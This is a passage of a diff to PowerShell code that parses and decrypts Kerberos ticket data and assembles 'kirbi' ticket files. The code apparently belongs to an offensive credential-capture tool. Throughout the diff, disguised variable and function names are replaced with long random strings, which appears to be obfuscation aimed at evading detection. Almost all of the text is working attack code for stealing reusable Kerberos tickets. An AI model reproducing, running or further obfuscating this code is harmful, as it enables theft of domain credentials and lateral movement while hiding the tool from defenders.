-        $AuntMale = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x00 + $AuntMale
-        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.count)[3..0] + $AuntMale
-        $AuntMale = 0xA3,0x84 + [System.BitConverter]::GetBytes($AuntMale.count)[3..0] + $AuntMale
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[0..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 5)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[$OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 5)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[$OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 5)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[$OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 5)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[$OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 5)]
+        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+        [Byte[]]$YaIOkAgFKnstbJXueWpvtoxtJyTqOTcXSsSSA = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 11)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 44)]
+        $vdTueEvfkBtCnRAvUKlQVknuw = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 46)]
+        [Byte[]]$XmgHbdtRifUNloNrdmuPCpfZoCo = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 47)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $vdTueEvfkBtCnRAvUKlQVknuw + 46)]
+        $eYUZHiWPcWdmsSIghOlerGVsRZMIgsFl = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $vdTueEvfkBtCnRAvUKlQVknuw + 59)]
+        $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr = $vdTueEvfkBtCnRAvUKlQVknuw + $eYUZHiWPcWdmsSIghOlerGVsRZMIgsFl
+        [Byte[]]$fRTeTaDyTMVOXwlIpTpdiUPLtnBBfYC = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $vdTueEvfkBtCnRAvUKlQVknuw + 60)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 59)]
+        [Byte[]]$dTyYPbAovqzMMhAwngLOtNRgB = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 65)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 68)]
+        [Byte[]]$CGsUpvXaqYtBltYMYgJgxroB = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 71)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 87)]
+        [Byte[]]$IrOTdGzokTJkiosNmMBgNvAGGlhwc = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 90)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 106)]
+        [Byte[]]$NgjuWSLCqxMLRUuSDNbGfhAzDusEGCwsOOvHru = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 109)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 125)]
+        $wlZvjQPXYoMYlQDDScmeOVCEUJVmVdDlqgJbyelf = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 127)]
+        [Byte[]]$pLewiQkGZJiwchHnvnZpDn = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 128)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + $wlZvjQPXYoMYlQDDScmeOVCEUJVmVdDlqgJbyelf + 127)]
+        $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr += $wlZvjQPXYoMYlQDDScmeOVCEUJVmVdDlqgJbyelf
+        $HGMDfTBruvghVLwiKVvrGhifCVpeZxlHvQzdK = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 140)]
+        [Byte[]]$PlZHlmjGbmPTLzAwndWwffbYddhlHABlDjv = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + 141)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $coVbwRjyubWpZVKpvjDyGOFYQkmzvSENTr + $HGMDfTBruvghVLwiKVvrGhifCVpeZxlHvQzdK + 140)]
+        [Byte[]]$DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0x30,0x84 + [System.BitConverter]::GetBytes($PlZHlmjGbmPTLzAwndWwffbYddhlHABlDjv.Count)[3..0] + $PlZHlmjGbmPTLzAwndWwffbYddhlHABlDjv
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA1,0x84 + [System.BitConverter]::GetBytes($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh.Count)[3..0] + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0x30,0x84 + [System.BitConverter]::GetBytes($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh.Count)[3..0] + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA9,0x84 + [System.BitConverter]::GetBytes($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh.Count)[3..0] + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA8,0x84 + [System.BitConverter]::GetBytes($pLewiQkGZJiwchHnvnZpDn.Count)[3..0] + $pLewiQkGZJiwchHnvnZpDn + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA7,0x84 + [System.BitConverter]::GetBytes($NgjuWSLCqxMLRUuSDNbGfhAzDusEGCwsOOvHru.Count)[3..0] + $NgjuWSLCqxMLRUuSDNbGfhAzDusEGCwsOOvHru + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA6,0x84 + [System.BitConverter]::GetBytes($IrOTdGzokTJkiosNmMBgNvAGGlhwc.Count)[3..0] + $IrOTdGzokTJkiosNmMBgNvAGGlhwc + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA5,0x84 + [System.BitConverter]::GetBytes($CGsUpvXaqYtBltYMYgJgxroB.Count)[3..0] + $CGsUpvXaqYtBltYMYgJgxroB + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0xA3,0x84,0x00,0x00,0x00,0x07,0x03,0x05,0x00 + $dTyYPbAovqzMMhAwngLOtNRgB + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        [Byte[]]$rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0x30,0x84 + [System.BitConverter]::GetBytes($fRTeTaDyTMVOXwlIpTpdiUPLtnBBfYC.Count)[3..0] + $fRTeTaDyTMVOXwlIpTpdiUPLtnBBfYC
+        $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0xA1,0x84 + [System.BitConverter]::GetBytes($rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN.Count)[3..0] + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN
+        $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x01 + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN
+        $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0x30,0x84 + [System.BitConverter]::GetBytes($rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN.Count)[3..0] + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN
+        $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0xA2,0x84 + [System.BitConverter]::GetBytes($rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN.Count)[3..0] + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN
+        $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = 0xA1,0x84 + [System.BitConverter]::GetBytes($XmgHbdtRifUNloNrdmuPCpfZoCo.Count)[3..0] + $XmgHbdtRifUNloNrdmuPCpfZoCo + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN
+        [Byte[]]$cBiKFEXRziLqcSvbkAToWH = 0xA1,0x84 + [System.BitConverter]::GetBytes($YaIOkAgFKnstbJXueWpvtoxtJyTqOTcXSsSSA.Count)[3..0] + $YaIOkAgFKnstbJXueWpvtoxtJyTqOTcXSsSSA
+        $cBiKFEXRziLqcSvbkAToWH = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12 + $cBiKFEXRziLqcSvbkAToWH
+        $cBiKFEXRziLqcSvbkAToWH = 0x30,0x84 + [System.BitConverter]::GetBytes($cBiKFEXRziLqcSvbkAToWH.Count)[3..0] + $cBiKFEXRziLqcSvbkAToWH
+        $cBiKFEXRziLqcSvbkAToWH = 0xA0,0x84 + [System.BitConverter]::GetBytes($cBiKFEXRziLqcSvbkAToWH.Count)[3..0] + $cBiKFEXRziLqcSvbkAToWH
+        [Byte[]]$RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = $cBiKFEXRziLqcSvbkAToWH + $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0x30,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0x30,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0xA0,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0x30,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0x7D,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0x04,0x82 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[1..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0xA2,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.Count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x00 + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0x30,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
+        $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV = 0xA3,0x84 + [System.BitConverter]::GetBytes($RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV.count)[3..0] + $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
     
-        return $AuntMale
+        return $RdHJzkALxpgcqalRDjmFwXdTRsufKZgCpqVqnDeKtxAV
     }
 
     function New-KerberosKirbi
     {
-        param([Byte[]]$IckyBloody,[Byte[]]$UtterBang,[String]$NeedyArt,[String]$BlowAware,[String]$RejectFast)
+        param([Byte[]]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE,[Byte[]]$TXOKWOPVOPOIkTeJXaEmWVpFDvEmMfcu,[String]$TARrucOmQlOBzePOFHsFSOAIcpdw,[String]$oLTralsUhFsCccshiXXLsSDBjJkoreaPpGrOO,[String]$RCwIBkMHHWDnJkpbTUzbmnVUjDkqM)
 
-        $CloudyDreary = [System.BitConverter]::ToString($IckyBloody)
-        $CloudyDreary = $CloudyDreary -replace "-",""
-        $SongsStir = $CloudyDreary.IndexOf("A003020112A1030201")
+        $DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx = [System.BitConverter]::ToString($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE)
+        $DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx = $DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx -replace "-",""
+        $tLbBDJvMkKWqDcFfKWHq = $DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx.IndexOf("A003020112A1030201")
 
-        if($SongsStir -ge 0)
+        if($tLbBDJvMkKWqDcFfKWHq -ge 0)
         {
-            $GateNasty = Get-ASN1Length $IckyBloody[($SongsStir / 2 + 10)..($SongsStir / 2 + 15)]
-            $TrashyMatch = $GateNasty[0]
-            $GateNasty = Get-ASN1Length $IckyBloody[($SongsStir / 2 + $TrashyMatch + 10)..($SongsStir / 2 + $TrashyMatch + 15)]
-            $TrashyMatch += $GateNasty[0]
-            $RushFog = $GateNasty[1]
-            [Byte[]]$SixGrade = $IckyBloody[($SongsStir / 2 + $TrashyMatch + 10)..($SongsStir / 2 + $TrashyMatch + $RushFog + 9)]
-            [Byte[]]$DollRotten = Get-KerberosAES256UsageKey encrypt 2 $UtterBang
-            [Byte[]]$AskEffect = Unprotect-HeapDetect $DollRotten $SixGrade[0..($SixGrade.Count - 13)]
-            $AskEffect = $AskEffect[16..$AskEffect.Count]
-            $SideBike = [System.BitConverter]::ToString($AskEffect)
-            $SideBike = $SideBike -replace "-",""
-            $SongsStir = $SideBike.IndexOf("A003020112A1")
+            $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE[($tLbBDJvMkKWqDcFfKWHq / 2 + 10)..($tLbBDJvMkKWqDcFfKWHq / 2 + 15)]
+            $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+            $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE[($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 10)..($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 15)]
+            $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+            $xkUeeAgowppjnpcqyHlyVcbyLQWEMJeUSnCSojspVUQn = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[1]
+            [Byte[]]$iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW = $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE[($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 10)..($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $xkUeeAgowppjnpcqyHlyVcbyLQWEMJeUSnCSojspVUQn + 9)]
+            [Byte[]]$eAUhBgHWHfdFohGZRXRwYmBoawzctiumKbaFJIWwD = Get-KerberosAES256UsageKey encrypt 2 $TXOKWOPVOPOIkTeJXaEmWVpFDvEmMfcu
+            [Byte[]]$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF = Unprotect-fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn $eAUhBgHWHfdFohGZRXRwYmBoawzctiumKbaFJIWwD $iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW[0..($iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW.Count - 13)]
+            $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[16..$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF.Count]
+            $PBbgOFiNdkegZghDXtwWHRPrGaVaaS = [System.BitConverter]::ToString($AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF)
+            $PBbgOFiNdkegZghDXtwWHRPrGaVaaS = $PBbgOFiNdkegZghDXtwWHRPrGaVaaS -replace "-",""
+            $tLbBDJvMkKWqDcFfKWHq = $PBbgOFiNdkegZghDXtwWHRPrGaVaaS.IndexOf("A003020112A1")
 
-            if($SongsStir -ge 0)
+            if($tLbBDJvMkKWqDcFfKWHq -ge 0)
             {
-                [Byte[]]$RoofExtend = $AskEffect[30..61]
-                [Byte[]]$DollRotten = Get-KerberosAES256UsageKey encrypt 11 $RoofExtend
-                $SongsStir = $CloudyDreary.IndexOf("A003020112A2")
+                [Byte[]]$kyQhSAQfbLOLSfpecwYgQTudWaCVUAmaYC = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[30..61]
+                [Byte[]]$eAUhBgHWHfdFohGZRXRwYmBoawzctiumKbaFJIWwD = Get-KerberosAES256UsageKey encrypt 11 $kyQhSAQfbLOLSfpecwYgQTudWaCVUAmaYC
+                $tLbBDJvMkKWqDcFfKWHq = $DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx.IndexOf("A003020112A2")
 
-                if($SongsStir -ge 0)
+                if($tLbBDJvMkKWqDcFfKWHq -ge 0)
                 {
-                    $GateNasty = Get-ASN1Length $IckyBloody[($SongsStir / 2 + 5)..($SongsStir / 2 + 10)]
-                    $TrashyMatch = $GateNasty[0]
-                    $GateNasty = Get-ASN1Length $IckyBloody[($SongsStir / 2 + $TrashyMatch + 5)..($SongsStir / 2 + $TrashyMatch + 10)]
-                    $TrashyMatch += $GateNasty[0]
-                    $RushFog = $GateNasty[1]
-                    [Byte[]]$SixGrade = $IckyBloody[($SongsStir / 2 + $TrashyMatch + 5)..($SongsStir / 2 + $TrashyMatch + $RushFog + 4)]
-                    [Byte[]]$AskEffect = Unprotect-HeapDetect $DollRotten $SixGrade[0..($SixGrade.Count - 13)]
-                    [Byte[]]$DollRotten = Get-KerberosAES256UsageKey encrypt 14 $RoofExtend
-                    $AskEffect = $AskEffect[16..$AskEffect.Count]
-                    [Byte[]]$JogPowder = Get-KirbiPartTwo $AskEffect
-                    $GateNasty = Get-ASN1Length $AskEffect[4..9]
-                    $TrashyMatch = $GateNasty[0]
-                    $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + 4)..($TrashyMatch + 9)]
-                    $TrashyMatch += $GateNasty[0]
-                    $FastGrass = $AskEffect[($TrashyMatch + 7)]
-                    $JoyousFound = Convert-DataToString 0 $FastGrass $AskEffect[($TrashyMatch + 8)..($TrashyMatch + $FastGrass + 7)]
-                    $CoilTrail = $AskEffect[($TrashyMatch + $FastGrass + 22)]
-                    $StuffDark = Convert-DataToString 0 $CoilTrail $AskEffect[($TrashyMatch + $FastGrass + 23)..($TrashyMatch + $FastGrass + $CoilTrail + 22)]
-                    $SideBike = [System.BitConverter]::ToString($AskEffect)
-                    $SideBike = $SideBike -replace "-",""
-                    $SongsStir = $SideBike.IndexOf("A003020112A2")
+                    $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE[($tLbBDJvMkKWqDcFfKWHq / 2 + 5)..($tLbBDJvMkKWqDcFfKWHq / 2 + 10)]
+                    $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+                    $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE[($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 5)..($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 10)]
+                    $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+                    $xkUeeAgowppjnpcqyHlyVcbyLQWEMJeUSnCSojspVUQn = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[1]
+                    [Byte[]]$iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW = $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE[($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 5)..($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $xkUeeAgowppjnpcqyHlyVcbyLQWEMJeUSnCSojspVUQn + 4)]
+                    [Byte[]]$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF = Unprotect-fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn $eAUhBgHWHfdFohGZRXRwYmBoawzctiumKbaFJIWwD $iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW[0..($iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW.Count - 13)]
+                    [Byte[]]$eAUhBgHWHfdFohGZRXRwYmBoawzctiumKbaFJIWwD = Get-KerberosAES256UsageKey encrypt 14 $kyQhSAQfbLOLSfpecwYgQTudWaCVUAmaYC
+                    $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[16..$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF.Count]
+                    [Byte[]]$rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN = Get-KirbiPartTwo $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF
+                    $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[4..9]
+                    $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+                    $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 4)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 9)]
+                    $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+                    $TgpNBuNfSlXhTuvhOPjKxUDRCJlATkdGOxsaiotTbf = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 7)]
